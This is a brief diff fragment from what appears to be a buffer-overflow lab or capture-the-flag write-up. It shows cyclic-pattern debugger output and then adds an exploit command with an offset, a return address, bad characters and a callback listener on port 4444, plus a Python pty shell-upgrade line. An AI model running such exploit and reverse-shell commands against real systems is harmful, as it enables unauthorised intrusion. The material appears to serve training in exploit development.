@@ -62,3 +62,8 @@ Nmap done: 1 IP address (1 host up) scanned in 69.09 seconds
     0x005ff6e8 : Pointer into normal cyclic pattern at ESP-0x228 (-552) : 0x005ff908 : offset 520, length 480
     0x005ff6f0 : Pointer into normal cyclic pattern at ESP-0x220 (-544) : 0x005ff700 : offset 0, length 1000
     0x005ffb00 : Pointer into normal cyclic pattern at ESP+0x1f0 (+496) : 0x005ffd30 : offset 512, length 488
+
+
+./exploit.py 10.10.153.137 9999 524 0x311712F3 10.4.15.254 4444 -b \x00\x30\x78\x80
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
